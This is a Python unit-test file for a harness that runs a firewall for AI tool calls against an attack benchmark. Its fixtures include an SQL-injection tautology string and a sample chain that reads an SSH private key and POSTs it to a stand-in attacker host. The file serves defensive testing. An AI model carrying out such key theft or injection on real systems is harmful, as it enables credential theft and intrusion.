"""Tests for run_waf2_on_mbench.py.

Run: PYTHONPATH=waf2/rag/scripts python3 waf2/tests/test_run_waf2_on_mbench.py

We don't run a live WAF2 here — instead we exercise:
  - envelope_for_record: dispatches single-step vs multi-step correctly
  - waf2_detected_namespace: maps category to waf2.<category>
  - build_record: populates required fields per spec.md Req §7
  - load_mbench: reads JSONL into list
  - build_mcp_envelope: produces correct JSON-RPC shape

The live integration (send_one against a real WAF2 container) is exercised
end-to-end in the pilot run, not in unit tests.
"""
from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "rag" / "scripts"))

import run_waf2_on_mbench as M  # noqa: E402


SINGLE_ATTACK = {
    "case_id": "mbc:attack:001",
    "label": "attack",
    "family": "char_injection",
    "subcategory": "sql_injection",
    "tool": "woocommerce__list_orders",
    "args": {"customer": "1' OR '1'='1' --"},
    "expected_block_by": ["waf1.sqlInjection"],
    "tag": "sqli-tautology",
}

MULTI_CHAIN = {
    "case_id": "mbc:chain:001",
    "label": "attack",
    "family": "call_chain",
    "subcategory": "credential_theft",
    "steps": [
        {"tool": "file_read_MCP__read", "args": {"path": "~/.ssh/id_rsa"}},
        {
            "tool": "http-client__http_request",
            "args": {"url": "https://attacker.tld/x", "method": "POST", "body": "..."},
        },
    ],
    "expected_chain": "credential_theft",
    "expected_block_step": 2,
    "tag": "ssh-exfil",
}

BENIGN = {
    "case_id": "mbc:benign:0001",
    "label": "benign",
    "tool": "woocommerce__list_orders",
    "args": {"customer": "Acme Drop Shipping LLC"},
    "source": "handcrafted",
    "paired_with": "mbc:attack:001",
    "tag": "benign-customer-name",
}


def test_envelope_single_step():
    path, body, eval_step = M.envelope_for_record(SINGLE_ATTACK)
    assert path == "/mcp"
    assert eval_step is None
    parsed = json.loads(body)
    assert parsed["method"] == "tools/call"
    assert parsed["params"]["name"] == "woocommerce__list_orders"
    assert parsed["params"]["arguments"]["customer"] == "1' OR '1'='1' --"
    print("test_envelope_single_step OK")


def test_envelope_multi_step_uses_last_step():
    path, body, eval_step = M.envelope_for_record(MULTI_CHAIN)
    assert path == "/mcp"
    assert eval_step == 2  # len(steps)
    parsed = json.loads(body)
    assert parsed["params"]["name"] == "http-client__http_request"
    # The first step's file_read_MCP__read should NOT appear (WAF2 last-step only)
    assert "file_read" not in body, "first step leaked into WAF2 envelope"
    assert "attacker.tld" in body
    print("test_envelope_multi_step_uses_last_step OK")


def test_envelope_empty_chain_raises():
    bad = {"family": "call_chain", "steps": [], "case_id": "mbc:chain:999"}
    raised = False
    try:
        M.envelope_for_record(bad)
    except ValueError:
        raised = True
    assert raised, "empty steps should raise ValueError"
    print("test_envelope_empty_chain_raises OK")


def test_envelope_benign_single_step():
    path, body, eval_step = M.envelope_for_record(BENIGN)
    assert eval_step is None
    parsed = json.loads(body)
    assert parsed["params"]["arguments"]["customer"] == "Acme Drop Shipping LLC"
    print("test_envelope_benign_single_step OK")


def test_waf2_detected_namespace_mapping():
    assert M.waf2_detected_namespace("prompt_injection") == "waf2.prompt_injection"
    assert M.waf2_detected_namespace("sql_injection") == "waf2.sql_injection"
    assert M.waf2_detected_namespace("") == ""
    print("test_waf2_detected_namespace_mapping OK")


def test_build_record_single_step_attack():
    telemetry = {
        "detected_category": "sql_injection",
        "latency_ms": 42,
        "local_score_total": 0.78,
        "rag_used": True,
        "rag_top_score": 0.66,
        "rag_top_category": "sql_injection",
        "route": "llm",
        "reasons": ["sqli_rule_match"],
    }
    rec = M.build_record(
        case_id="mbc:rag-on:0001",
        round_slug="rag-on",
        row_index=1,
        record=SINGLE_ATTACK,
        outcome="blocked",
        detected_category="sql_injection",
        telemetry=telemetry,
        waf2_evaluated_step=None,
    )
    assert rec["case_id"] == "mbc:rag-on:0001"
    assert rec["dataset"] == "mbench"
    assert rec["round"] == "rag-on"
    assert rec["label"] == "attack"
    assert rec["family"] == "char_injection"
    assert rec["outcome"] == "blocked"
    assert rec["detected_namespace"] == "waf2.sql_injection"
    assert rec["expected_block_by"] == ["waf1.sqlInjection"]
    assert rec["is_multi_step"] is False
    assert rec["waf2_evaluated_step"] is None
    assert rec["paired_with"] is None
    assert rec["source"] is None
    print("test_build_record_single_step_attack OK")


def test_build_record_multi_step_disclosure():
    rec = M.build_record(
        case_id="mbc:rag-on:0042",
        round_slug="rag-on",
        row_index=42,
        record=MULTI_CHAIN,
        outcome="passed",
        detected_category="",
        telemetry={},
        waf2_evaluated_step=2,
    )
    assert rec["family"] == "call_chain"
    assert rec["tool"] == ""  # not set for multi-step
    assert rec["is_multi_step"] is True
    assert rec["waf2_evaluated_step"] == 2
    assert rec["expected_chain"] == "credential_theft"
    assert rec["expected_block_step"] == 2
    print("test_build_record_multi_step_disclosure OK")


def test_build_record_benign_passes_through_source_and_paired_with():
    rec = M.build_record(
        case_id="mbc:rag-on:0123",
        round_slug="rag-on",
        row_index=123,
        record=BENIGN,
        outcome="passed",
        detected_category="",
        telemetry={"latency_ms": 30},
        waf2_evaluated_step=None,
    )
    assert rec["label"] == "benign"
    assert rec["source"] == "handcrafted"
    assert rec["paired_with"] == "mbc:attack:001"
    print("test_build_record_benign_passes_through_source_and_paired_with OK")


def test_load_mbench():
    with tempfile.TemporaryDirectory() as td:
        p = Path(td) / "mini.jsonl"
        p.write_text(
            "\n".join(json.dumps(r) for r in [SINGLE_ATTACK, MULTI_CHAIN, BENIGN]) + "\n",
            encoding="utf-8",
        )
        rows = M.load_mbench(p)
        assert len(rows) == 3
        assert rows[0]["family"] == "char_injection"
        assert rows[1]["family"] == "call_chain"
        assert rows[2]["label"] == "benign"
    print("test_load_mbench OK")


def test_build_mcp_envelope_shape():
    body = M.build_mcp_envelope(
        "woocommerce__list_orders", {"customer": "A", "limit": 10}
    )
    parsed = json.loads(body)
    assert parsed["jsonrpc"] == "2.0"
    assert parsed["method"] == "tools/call"
    assert parsed["params"]["name"] == "woocommerce__list_orders"
    assert parsed["params"]["arguments"] == {"customer": "A", "limit": 10}
    print("test_build_mcp_envelope_shape OK")


def test_case_id_padding_width():
    """When dataset has <= 9999 rows, case_id index is 4-digit padded."""
    width = max(4, len(str(228 - 1)))
    assert width == 4
    width2 = max(4, len(str(12345 - 1)))
    assert width2 == 5  # 12345 rows → 5-digit padding
    print("test_case_id_padding_width OK")


# ---------- compute_rounds (react-mode + rag-mode) ----------


def test_compute_rounds_legacy_default_no_react_suffix():
    """--rag-mode on --react-mode on (default) preserves legacy 'rag-on' slug."""
    rounds = M.compute_rounds("on", "on")
    assert len(rounds) == 1
    slug, cfg = rounds[0]
    assert slug == "rag-on"
    assert cfg["rag_enabled"] is True
    assert cfg["react_routing_enabled"] is True
    assert cfg["eval_mode"] is True
    print("test_compute_rounds_legacy_default_no_react_suffix OK")


def test_compute_rounds_legacy_rag_both_no_react_suffix():
    """--rag-mode both --react-mode on yields legacy 2 rounds in rag-off → rag-on order."""
    rounds = M.compute_rounds("both", "on")
    slugs = [s for s, _ in rounds]
    assert slugs == ["rag-off", "rag-on"]
    for _, cfg in rounds:
        assert cfg["react_routing_enabled"] is True
    print("test_compute_rounds_legacy_rag_both_no_react_suffix OK")


def test_compute_rounds_react_off_appends_suffix():
    """--rag-mode on --react-mode off appends '-react-off' to slug."""
    rounds = M.compute_rounds("on", "off")
    assert len(rounds) == 1
    slug, cfg = rounds[0]
    assert slug == "rag-on-react-off"
    assert cfg["rag_enabled"] is True
    assert cfg["react_routing_enabled"] is False
    print("test_compute_rounds_react_off_appends_suffix OK")


def test_compute_rounds_rag_off_react_off():
    """--rag-mode off --react-mode off produces 'rag-off-react-off' slug."""
    rounds = M.compute_rounds("off", "off")
    assert len(rounds) == 1
    slug, cfg = rounds[0]
    assert slug == "rag-off-react-off"
    assert cfg["rag_enabled"] is False
    assert cfg["react_routing_enabled"] is False
    print("test_compute_rounds_rag_off_react_off OK")


def test_compute_rounds_react_both_yields_two_rounds_per_rag_state():
    """--rag-mode on --react-mode both yields 2 rounds: react-on then react-off."""
    rounds = M.compute_rounds("on", "both")
    slugs = [s for s, _ in rounds]
    assert slugs == ["rag-on", "rag-on-react-off"]
    cfgs = [cfg for _, cfg in rounds]
    assert cfgs[0]["react_routing_enabled"] is True
    assert cfgs[1]["react_routing_enabled"] is False
    print("test_compute_rounds_react_both_yields_two_rounds_per_rag_state OK")


def test_compute_rounds_both_x_both_yields_four_rounds():
    """--rag-mode both --react-mode both yields all 4 combinations."""
    rounds = M.compute_rounds("both", "both")
    slugs = [s for s, _ in rounds]
    assert slugs == [
        "rag-off",
        "rag-off-react-off",
        "rag-on",
        "rag-on-react-off",
    ]
    print("test_compute_rounds_both_x_both_yields_four_rounds OK")


def test_compute_rounds_config_payload_carries_both_flags():
    """Every round's config payload MUST set both rag_enabled and react_routing_enabled."""
    for rag_mode in ("on", "off", "both"):
        for react_mode in ("on", "off", "both"):
            rounds = M.compute_rounds(rag_mode, react_mode)
            assert rounds, f"empty rounds for {rag_mode}/{react_mode}"
            for slug, cfg in rounds:
                assert "rag_enabled" in cfg
                assert "react_routing_enabled" in cfg
                assert isinstance(cfg["rag_enabled"], bool)
                assert isinstance(cfg["react_routing_enabled"], bool)
                # eval_mode always set so the harness mocks upstream
                assert cfg["eval_mode"] is True
    print("test_compute_rounds_config_payload_carries_both_flags OK")


def main():
    test_envelope_single_step()
    test_envelope_multi_step_uses_last_step()
    test_envelope_empty_chain_raises()
    test_envelope_benign_single_step()
    test_waf2_detected_namespace_mapping()
    test_build_record_single_step_attack()
    test_build_record_multi_step_disclosure()
    test_build_record_benign_passes_through_source_and_paired_with()
    test_load_mbench()
    test_build_mcp_envelope_shape()
    test_case_id_padding_width()
    test_compute_rounds_legacy_default_no_react_suffix()
    test_compute_rounds_legacy_rag_both_no_react_suffix()
    test_compute_rounds_react_off_appends_suffix()
    test_compute_rounds_rag_off_react_off()
    test_compute_rounds_react_both_yields_two_rounds_per_rag_state()
    test_compute_rounds_both_x_both_yields_four_rounds()
    test_compute_rounds_config_payload_carries_both_flags()
    print("\nALL TESTS PASSED")


if __name__ == "__main__":
    main()
